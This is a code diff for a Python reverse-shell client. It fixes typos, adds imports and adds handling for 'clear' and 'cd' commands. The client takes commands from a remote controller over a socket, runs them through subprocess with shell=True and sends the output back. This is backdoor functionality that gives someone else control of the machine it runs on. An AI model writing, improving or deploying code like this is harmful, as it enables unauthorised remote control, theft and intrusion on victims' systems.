@@ -1,6 +1,8 @@
 import socket
 import time
 import subprocess
+import json
+import os
 
 
 
@@ -12,7 +14,7 @@ def reliable_recv():
     data = ''
     while True:
         try:
-            data = data + s.recv(1024).decode().rstip()
+            data = data + s.recv(1024).decode().rstrip()
             return json.loads(data)
         except ValueError:
             continue
@@ -37,10 +39,14 @@ def shell():
             command = reliable_recv()
             if command == 'quit':
                     break
+            elif command == 'clear':
+                pass
+            elif command[:3] == 'cd ':
+                os.chdir(command[3:])
             else: 
                     execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                     result = execute.stdout.read() + execute.stderr.read()
-                    result = result.decode()3
+                    result = result.decode()
                     reliable_send(result)
                     
                     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
